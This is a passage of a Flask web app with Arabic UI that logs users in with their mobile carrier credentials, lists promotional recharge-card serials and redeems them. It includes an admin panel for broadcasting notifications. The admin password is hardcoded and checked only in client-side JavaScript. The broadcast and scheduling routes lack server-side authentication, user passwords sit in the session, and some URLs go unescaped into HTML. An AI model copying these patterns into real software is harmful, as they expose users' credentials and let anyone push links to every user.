                                       .replace('#ff5555','rgba(255,85,85,.09)');
    el.classList.add('has-link');
  } else {
    actionBtn.style.display = 'none';
    el.classList.remove('has-link');
  }

  // شريط التقدم
  fill.style.transition='none';
  fill.style.transform='scaleX(1)';
  fill.style.transformOrigin='right';

  el.classList.add('show');
  clearTimeout(notifTimer);

  requestAnimationFrame(()=>{
    requestAnimationFrame(()=>{
      fill.style.transition=`transform ${duration}ms linear`;
      fill.style.transform='scaleX(0)';
    });
  });

  notifTimer = setTimeout(()=>el.classList.remove('show'), duration);
}

/* ══════════════════════════════════════════════
   LIVE DOT — 5 TAPS → ADMIN
══════════════════════════════════════════════ */
let tapCount=0, tapTimer=null;
function handleLiveTap(){
  tapCount++;
  // فلاشة بصرية على كل ضغطة
  const dot = _('liveDotBtn');
  dot.style.transform='scale(1.8)';
  dot.style.boxShadow='0 0 0 6px rgba(0,200,90,.4)';
  setTimeout(()=>{ dot.style.transform=''; dot.style.boxShadow=''; }, 200);

  clearTimeout(tapTimer);
  if(tapCount >= 5){
    tapCount=0;
    openAdmin();
  } else {
    tapTimer = setTimeout(()=>tapCount=0, 2500);
  }
}

/* ══════════════════════════════════════════════
   ADMIN PANEL
══════════════════════════════════════════════ */
const ADMIN_PW = '1052003Mm$#@';
let adminAuthed = false;
let selectedType = 'info';

function openAdmin(){
  _('adminOverlay').classList.add('open');
  // reset auth لو مش authed
  if(!adminAuthed){
    _('adminAuth').style.display='';
    _('adminContent').classList.remove('visible');
    _('adminPwInput').value='';
    _('authErr').classList.remove('show');
    updatePinDots(0,'');
    setTimeout(()=>_('adminPwInput').focus(), 350);
  } else {
    loadAdminStats();
  }
}
function closeAdmin(){
  _('adminOverlay').classList.remove('open');
}
// إغلاق بالضغط على الخلفية
_('adminOverlay').addEventListener('click',function(e){
  if(e.target===this) closeAdmin();
});

function updatePinDots(len, state){
  const dots = _('pinDots').querySelectorAll('.pin-dot');
  dots.forEach((d,i)=>{
    d.classList.remove('filled','err');
    if(i < len) d.classList.add(state||'filled');
  });
}

function checkAdminPw(){
  const val = _('adminPwInput').value;
  updatePinDots(Math.min(val.length,6),'filled');
  if(val === ADMIN_PW){
    adminAuthed=true;
    _('adminAuth').style.display='none';
    _('adminContent').classList.add('visible');
    loadAdminStats();
  } else {
    updatePinDots(6,'err');
    _('authErr').classList.add('show');
    setTimeout(()=>{
      updatePinDots(0,'');
      _('authErr').classList.remove('show');
      _('adminPwInput').value='';
    }, 1200);
  }
}

async function loadAdminStats(){
  try{
    const r=await fetch('/admin-stats'); const d=await r.json();
    if(d.ok){
      _('adm-online').textContent = d.online;
      _('adm-today').textContent  = d.today;
      _('adm-views').textContent  = d.views ?? '—';
    }
  }catch{}
}

function setType(t){
  selectedType=t;
  ['info','ok','err'].forEach(x=>{
    const b=_('type-'+x);
    b.className='type-btn';
    if(x===t) b.classList.add('active-'+x);
  });
  updatePreview();
}

function updatePreview(){
  const title   = _('notifTitleInput').value || 'TALASHNY';
  const text    = _('notifMsgInput').value   || 'نص الرسالة هيظهر هنا...';
  const iconUrl = _('notifIconInput').value.trim();
  const linkUrl = _('notifLinkInput').value.trim();
  const btnLbl  = _('notifBtnInput').value.trim() || 'افتح الرابط';
  const icons   = { info:'fa-bell', ok:'fa-circle-check', err:'fa-circle-exclamation' };

  _('prevTitle').textContent = title;
  _('prevText').textContent  = text;

  // أيقونة preview
  const pw = _('prevIconWrap');
  if(iconUrl){
    pw.innerHTML=`<img src="${iconUrl}" style="width:28px;height:28px;border-radius:7px;object-fit:cover" onerror="this.outerHTML='<i class=\\'fas fa-bell\\'></i>'"/>`;
  } else {
    pw.innerHTML=`<i class="fas ${icons[selectedType]||'fa-bell'}"></i>`;
  }

  // زرار preview
  const pb = _('prevBtn');
  if(linkUrl){ pb.style.display='block'; _('prevBtnLabel').textContent=btnLbl; }
  else { pb.style.display='none'; }

  const prev = _('notifPreview');
  prev.className='notif-preview';
  if(selectedType==='ok')  prev.classList.add('type-ok');
  if(selectedType==='err') prev.classList.add('type-err');
}

/* ══ صوت الإشعار ══ */
function playNotifSound(){
  try{
    const ctx = new (window.AudioContext||window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain= ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.type='sine'; osc.frequency.setValueAtTime(880, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(440, ctx.currentTime+0.15);
    gain.gain.setValueAtTime(0.18, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime+0.3);
    osc.start(); osc.stop(ctx.currentTime+0.3);
  }catch{}
}

/* ══ Admin Tabs ══ */
function switchTab(tab){
  ['send','schedule','history'].forEach(t=>{
    _('tab-'+t)?.classList.toggle('active', t===tab);
  });
  _('tabSend').style.display     = tab==='send'     ? '' : 'none';
  _('tabSchedule').style.display = tab==='schedule' ? '' : 'none';
  _('tabHistory').style.display  = tab==='history'  ? '' : 'none';
  if(tab==='history')  loadHistory();
  if(tab==='schedule') loadSchedule();
}

/* ══ Schedule JS ══ */
let selectedSchedType = 'info';

function setSchedType(t){
  selectedSchedType = t;
  ['info','ok','err'].forEach(x=>{
    const b=_('stype-'+x);
    if(!b) return;
    b.className='type-btn';
    if(x===t) b.classList.add('active-'+x);
  });
}

// اضبط أقل قيمة للوقت = الآن
function initSchedTime(){
  const inp = _('schedTimeInput');
  if(!inp) return;
  const now = new Date();
  now.setMinutes(now.getMinutes()+5);
  const iso = now.toISOString().slice(0,16);
  inp.min   = iso;
  inp.value = iso;
}

async function addSchedule(){
  const title   = _('schedTitleInput').value.trim() || 'TALASHNY';
  const text    = _('schedMsgInput').value.trim();
  const fireVal = _('schedTimeInput').value;
  const link    = _('schedLinkInput').value.trim();
  if(!text)   { showToast('اكتب نص الإشعار','err'); return; }
  if(!fireVal){ showToast('اختار وقت الإرسال','err'); return; }

  const fireDate  = new Date(fireVal);
  const fireTs    = Math.floor(fireDate.getTime() / 1000);
  const nowTs     = Math.floor(Date.now() / 1000);
  if(fireTs <= nowTs){ showToast('الوقت لازم يكون في المستقبل','err'); return; }

  const fireDisplay = fireDate.toLocaleDateString('ar-EG',{month:'short',day:'numeric'})
                    + ' ' + fireDate.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'});

  const btn = document.querySelector('#tabSchedule .btn-send-notif');
  if(btn){ btn.disabled=true; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;جاري الحفظ...'; }
  try{
    const fd = new FormData();
    fd.append('text',      text);
    fd.append('type',      selectedSchedType);
    fd.append('title',     title);
    fd.append('fire_at',   fireDisplay);
    fd.append('fire_at_ts', String(fireTs));
    fd.append('link',      link);
    fd.append('duration',  '300');
    const r = await fetch('/schedule-add',{method:'POST',body:fd});
    const d = await r.json();
    if(d.ok){
      showToast('✅ تم الجدولة — '+fireDisplay,'ok');
      _('schedMsgInput').value=''; _('schedLinkInput').value='';
      loadSchedule();
    } else {
      showToast('❌ '+(d.error||'خطأ'),'err');
    }
  } catch(e){ showToast('❌ خطأ في الاتصال','err'); }
  if(btn){ btn.disabled=false; btn.innerHTML='<i class="fas fa-calendar-plus"></i>&nbsp;جدولة الإشعار'; }
}

function fmtFireAt(ts){
  try{
    const d = new Date(parseFloat(ts)*1000);
    return d.toLocaleDateString('ar-EG',{month:'short',day:'numeric'})
         + ' — ' + d.toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'});
  }catch{ return '—'; }
}

async function loadSchedule(){
  initSchedTime();
  try{
    const r=await fetch('/schedule-list'); const d=await r.json();
    const wrap=_('schedList');
    // فرق التوقيت بين السيرفر والمتصفح
    const serverTs   = d.server_time || 0;
    const clientTs   = Date.now()/1000;
    const diffMin    = Math.round((clientTs - serverTs)/60);
    const diffWarn   = Math.abs(diffMin) > 5
      ? `<div style="font-size:.52rem;color:var(--gold);background:rgba(232,199,111,.08);border:1px solid rgba(232,199,111,.2);border-radius:8px;padding:6px 10px;margin-bottom:10px">
           <i class="fas fa-triangle-exclamation"></i>&nbsp;فرق التوقيت: ${diffMin > 0 ? '+' : ''}${diffMin} دقيقة — السيرفر قد يكون UTC
         </div>` : '';
    const items=d.items||[];
    if(!items.filter(i=>!i.done).length && !items.length){
      wrap.innerHTML=diffWarn+'<div class="hist-empty"><i class="fas fa-calendar-xmark" style="display:block;font-size:1.5rem;margin-bottom:8px;opacity:.3"></i>لا توجد إشعارات مجدولة</div>';
      return;
    }
    wrap.innerHTML=diffWarn+items.map(s=>`
      <div class="sched-item type-${s.type||'info'}${s.done?' done-item':''}">
        <div class="sched-item-body">
          <div class="sched-item-title">${esc(s.title||'TALASHNY')}</div>
          <div class="sched-item-text">${esc(s.text)}</div>
          <div class="sched-item-time ${s.done?'done-badge':''}">
            ${s.done?'<i class="fas fa-check"></i> تم الإرسال':'<i class="fas fa-clock"></i> '+fmtFireAt(s.fire_at_ts)}
          </div>
        </div>
        ${!s.done?`<div class="sched-del" onclick="deleteSchedule('${esc(s.id)}')"><i class="fas fa-trash"></i></div>`:''}
      </div>
    `).join('');
  }catch(e){
    _('schedList').innerHTML='<div class="hist-empty">خطأ في التحميل</div>';
  }
}

async function deleteSchedule(id){
  const fd=new FormData(); fd.append('id',id);
  await fetch('/schedule-delete',{method:'POST',body:fd});
  showToast('🗑️ تم الحذف','ok');
  loadSchedule();
}

async function loadHistory(){
  try{
    const r = await fetch('/broadcast-history');
    const d = await r.json();
    const wrap = _('histList');
    if(!d.history?.length){
      wrap.innerHTML='<div class="hist-empty"><i class="fas fa-inbox" style="display:block;font-size:1.5rem;margin-bottom:8px;opacity:.3"></i>لا يوجد سجل بعد</div>';
      return;
    }
    const typeIcon={info:'fa-bell',ok:'fa-circle-check',err:'fa-circle-exclamation'};
    wrap.innerHTML = d.history.map(h=>`
      <div class="hist-item type-${h.type||'info'}">
        <div class="hist-item-body">
          <div class="hist-item-title">${esc(h.title||'TALASHNY')}</div>
          <div class="hist-item-text">${esc(h.text)}</div>
          <div class="hist-item-meta">
            <span class="hist-meta-chip hist-meta-time"><i class="fas fa-clock"></i>&nbsp;${esc(h.sent_at||'')}</span>
            <span class="hist-meta-chip hist-meta-views"><i class="fas fa-eye"></i>&nbsp;${h.views||0} مشاهدة</span>
          </div>
        </div>
        <div class="hist-resend" onclick="resendNotif(${JSON.stringify(h).replace(/"/g,'&quot;')})" title="إعادة إرسال">
          <i class="fas fa-rotate-right"></i>
        </div>
      </div>
    `).join('');
  }catch{}
}

async function resendNotif(h){
  _('notifTitleInput').value = h.title||'TALASHNY';
  _('notifMsgInput').value   = h.text||'';
  setType(h.type||'info');
  updatePreview();
  switchTab('send');
  showToast('✏️ تم تحميل الإشعار — عدّله وابعته','ok');
}

function setDur(el, sec){
  selectedDur = sec;
  document.querySelectorAll('.dur-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
}

async function sendNotif(){
  const title   = _('notifTitleInput').value.trim() || 'TALASHNY';
  const text    = _('notifMsgInput').value.trim();
  if(!text){ showToast('اكتب رسالة الأول','err'); return; }
  const iconUrl = _('notifIconInput').value.trim();
  const linkUrl = _('notifLinkInput').value.trim();
  const btnLbl  = _('notifBtnInput').value.trim() || 'افتح الرابط';

  const btn = document.querySelector('.btn-send-notif');
  btn.disabled=true; btn.innerHTML='<i class="fas fa-spinner fa-spin"></i>&nbsp;جاري الإرسال...';
  try{
    const fd=new FormData();
    fd.append('text',text); fd.append('type',selectedType);
    fd.append('title',title); fd.append('duration',selectedDur);
    fd.append('icon', iconUrl); fd.append('link', linkUrl);
    fd.append('btn_label', btnLbl);
    const r=await fetch('/broadcast',{method:'POST',body:fd}); const d=await r.json();
    if(d.ok){
      showToast('✅ تم إرسال الإشعار للكل','ok');
      closeAdmin();
      showNotif(title, text, selectedType, Math.min(selectedDur*1000,8000), iconUrl, linkUrl, btnLbl);
    }
  }catch{ showToast('❌ خطأ في الإرسال','err'); }
  btn.disabled=false; btn.innerHTML='<i class="fas fa-paper-plane"></i>&nbsp;إرسال للكل';
}

async function clearNotif(){
  const fd=new FormData();
  fd.append('text',''); fd.append('type','info');
  fd.append('title','TALASHNY'); fd.append('duration','0');
  await fetch('/broadcast',{method:'POST',body:fd});
  showToast('✅ تم مسح الإشعار','ok');
  lastBroadcast='';
}

/* ── RENDER ── */
function renderCards(list,online){
  const wrap=_('cardsWrap'), cnt=_('ccnt');
  if(online!==undefined) _('st-online').textContent=online;
  if(!list||!list.length){
    cnt.textContent='0'; _('st-total').textContent='0'; _('st-max').textContent='—';
    wrap.innerHTML='<div class="empty"><i class="fas fa-inbox"></i><p>لا توجد عروض متاحة الآن</p><small>يتجدد البحث تلقائياً...</small></div>';
    return;
  }
  cnt.textContent=list.length+' كرت';
  _('st-total').textContent=list.length;
  _('st-max').textContent=Math.max(...list.map(c=>c.amount))+' ج';
  wrap.innerHTML=list.map((p,i)=>{
    const ussd='*858*'+p.serial.replace(/\s/g,'')+'#';
    return`<div class="promo-card" style="--i:${i}">
      <div class="card-stripe"></div>
      <div class="card-body">
        <div style="flex:1"><div class="card-chips">
          <span class="chip chip-gold"><i class="fas fa-gift"></i>${esc(p.gift)} وحدة</span>
          <span class="chip chip-blue"><i class="fas fa-rotate"></i>${esc(p.remaining)} متبقي</span>
        </div></div>
        <div class="card-amount">
          <div class="amt-num">${esc(p.amount)}</div>
          <div class="amt-cur">جنيه</div>
        </div>
      </div>
      <div class="card-serial">
        <span class="serial-val">${esc(p.serial)}</span>
        <button onclick="copySerial(this)" class="btn-copy"><i class="fas fa-clone"></i></button>
      </div>
      <div class="card-btns">
        <button class="btn-charge" onclick="chargeCard('${esc(p.serial)}','${esc(p.amount)}',this)">
          <i class="fas fa-bolt"></i>&nbsp;<span>شحن أونلاين</span>
        </button>
        <a href="tel:${encodeURIComponent(ussd)}" class="btn-dial">
          <i class="fas fa-phone"></i>&nbsp;<span>شحن بالهاتف</span>
        </a>
      </div>
    </div>`;
  }).join('');
}

/* ── TIMER ── */
const CIRC=2*Math.PI*16;
function startTimer(cb){
  let t=15; const num=_('tnum'), prog=_('tprog');
  if(!num||!prog) return;
  prog.style.strokeDasharray=CIRC; prog.style.strokeDashoffset=0;
  clearInterval(timerInt);
  timerInt=setInterval(()=>{
    t--; num.textContent=Math.max(t,0);
    prog.style.strokeDashoffset=CIRC*(t/15);
    prog.style.stroke=t<=4?'#ff3333':'var(--red)';
    if(t<=0){ clearInterval(timerInt); setTimeout(cb,200); }
  },1000);
}

let lastBroadcastId='';
async function getCards(){
  try{
    const r=await fetch('/fetch?t='+Date.now()); const d=await r.json();
    if(d.ok){
      renderCards(d.promos,d.online);
      const bc = d.broadcast;
      if(bc?.text && bc.id && bc.id !== lastBroadcastId){
        lastBroadcastId = bc.id;
        fetch('/broadcast-view',{method:'POST'}).catch(()=>{});
        playNotifSound();
        showNotif(
          bc.title||'TALASHNY', bc.text,
          bc.type||'info',
          Math.min((bc.duration||300)*1000, 8000),
          bc.icon||'', bc.link||'', bc.btn_label||'افتح الرابط'
        );
      }
    }
  }catch{}
}
function startCycle(){ getCards(); startTimer(()=>startCycle()); }
</script>
</body>
</html>"""

# ══════════════════════════════════════════════════════
#  ROUTES
# ══════════════════════════════════════════════════════
@app.route("/")
def index():
    return render_template_string(PAGE)

@app.route("/check")
def check():
    if session.get("logged_in"):
        sid = session.get("sid","")
        if sid: update_online(sid)
        return jsonify({"logged":True,"number":session.get("number","")})
    return jsonify({"logged":False})

@app.route("/login", methods=["POST"])
def login():
    number   = request.form.get("number","").strip()
    password = request.form.get("password","").strip()
    if not number or not password:
        return jsonify({"ok":False,"error":"الرجاء إدخال رقم الموبايل وكلمة المرور"})
    res = api_login(number, password)
    if "access_token" in res:
        import uuid
        sid = str(uuid.uuid4())
        session.clear()
        session["logged_in"]  = True
        session["token"]      = res["access_token"]
        session["token_exp"]  = time.time() + int(res.get("expires_in",3600)) - 120
        session["number"]     = number
        session["password"]   = password
        session["sid"]        = sid
        update_online(sid)
        return jsonify({"ok":True,"number":number})
    return jsonify({"ok":False,"error":"الرقم أو الباسورد غلط — تحقق وحاول تاني"})

@app.route("/ping")
def ping():
    sid = session.get("sid","")
    if sid: update_online(sid)
    return jsonify({"ok":True,"online":get_online_count()})

@app.route("/fetch")
def fetch():
    if not session.get("logged_in"):
        return jsonify({"ok":False})
    sid = session.get("sid","")
    if sid: update_online(sid)
    do_refresh()
    check_schedule_and_fire()   # ← تحقق من الجدولة مع كل fetch
    return jsonify({
        "ok":    True,
        "promos":api_promos(session["token"],session["number"]),
        "online":get_online_count(),
        "broadcast": read_broadcast()
    })

@app.route("/broadcast", methods=["POST"])
def broadcast():
    text      = request.form.get("text","")
    typ       = request.form.get("type","info")
    title     = request.form.get("title","TALASHNY")
    duration  = int(request.form.get("duration", 300))
    icon      = request.form.get("icon","")
    link      = request.form.get("link","")
    btn_label = request.form.get("btn_label","افتح الرابط")
    write_broadcast(text, typ, title, duration, icon, link, btn_label)
    return jsonify({"ok":True})

@app.route("/broadcast-view", methods=["POST"])
def broadcast_view():
    try:
        if os.path.exists(BROADCAST_FILE):
            with open(BROADCAST_FILE,"r",encoding="utf-8") as f:
                data = json.load(f)
            if data.get("text") and data.get("expire",0) > time.time():
                data["views"] = data.get("views",0) + 1
                bid = data.get("id","")
                with open(BROADCAST_FILE,"w",encoding="utf-8") as f:
                    json.dump(data, f, ensure_ascii=False)
                # حدّث السجل كمان
                if bid and os.path.exists(HISTORY_FILE):
                    with open(HISTORY_FILE,"r",encoding="utf-8") as f:
                        history = json.load(f)
                    for h in history:
                        if h.get("id") == bid:
                            h["views"] = data["views"]; break
                    with open(HISTORY_FILE,"w",encoding="utf-8") as f:
                        json.dump(history, f, ensure_ascii=False)
    except: pass
    return jsonify({"ok":True})

@app.route("/broadcast-history")
def broadcast_history():
    try:
        if not os.path.exists(HISTORY_FILE):
            return jsonify({"ok":True,"history":[]})
        with open(HISTORY_FILE,"r",encoding="utf-8") as f:
            history = json.load(f)
        return jsonify({"ok":True,"history":history})
    except:
        return jsonify({"ok":True,"history":[]})

@app.route("/schedule-add", methods=["POST"])
def schedule_add():
    import uuid as _u
    try:
        fire_at_ts = float(request.form.get("fire_at_ts", 0))  # unix timestamp من المتصفح
        fire_at    = request.form.get("fire_at","")            # نص للعرض فقط
        text       = request.form.get("text","").strip()
        typ        = request.form.get("type","info")
        title      = request.form.get("title","TALASHNY")
        duration   = int(request.form.get("duration",300))
        icon       = request.form.get("icon","")
        link       = request.form.get("link","")
        btn_lbl    = request.form.get("btn_label","افتح الرابط")
        if not fire_at_ts or not text:
            return jsonify({"ok":False,"error":"بيانات ناقصة"})
        if fire_at_ts <= time.time():
            return jsonify({"ok":False,"error":"الوقت لازم يكون في المستقبل"})
        items = read_schedule()
        items.append({
            "id":        str(_u.uuid4())[:8],
            "fire_at":   fire_at,
            "fire_at_ts":fire_at_ts,
            "text":      text,
            "type":      typ,
            "title":     title,
            "duration":  duration,
            "icon":      icon,
            "link":      link,
            "btn_label": btn_lbl,
            "done":      False
        })
        write_schedule(items)
        return jsonify({"ok":True})
    except Exception as e:
        return jsonify({"ok":False,"error":str(e)})

@app.route("/schedule-list")
def schedule_list():
    items   = read_schedule()
    cutoff  = time.time() - 86400
    items   = [i for i in items if not (i.get("done") and float(i.get("fire_at_ts",0)) < cutoff)]
    write_schedule(items)
    return jsonify({"ok":True,"items":items,"server_time":time.time()})

@app.route("/schedule-debug")
def schedule_debug():
    """للتشخيص — يوضح الوقت الحالي للسيرفر والإشعارات المجدولة"""
    return jsonify({
        "server_time":    time.time(),
        "server_time_hr": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "items":          read_schedule()
    })

@app.route("/schedule-delete", methods=["POST"])
def schedule_delete():
    sid   = request.form.get("id","")
    items = [i for i in read_schedule() if i.get("id") != sid]
    write_schedule(items)
    return jsonify({"ok":True})

@app.route("/admin-stats")
def admin_stats():
    today = get_today()
    with daily_lock:
        count = daily_charges.get("count",0) if daily_charges.get("date")==today else 0
    # عداد المشاهدات
    views = 0
    try:
        bc = read_broadcast()
        views = bc.get("views",0) if bc.get("text") else 0
    except: pass
    return jsonify({"ok":True,"online":get_online_count(),"today":count,"views":views})

@app.route("/redeem")
def redeem():
    if not session.get("logged_in"):
        return jsonify({"ok":False})
    do_refresh()
    serial = request.args.get("serial","").strip()
    amount = request.args.get("amount","?")
    code   = api_redeem(session["token"],session["number"],serial)
    if code == 200:
        record_charge(session["number"], serial, amount)
    return jsonify({"ok":code==200,"code":code})

@app.route("/logout")
def logout():
    sid = session.get("sid","")
    if sid:
        with online_lock:
            online_users.pop(sid, None)
    session.clear()
    return jsonify({"ok":True})

# ══════════════════════════════════════════════════════
if __name__ == "__main__":
    print("\n"+"═"*40)
    print("  TALASHNY  |  http://localhost:5000")
    print("═"*40+"\n")
    app.run(host="0.0.0.0", port=5000, debug=False)
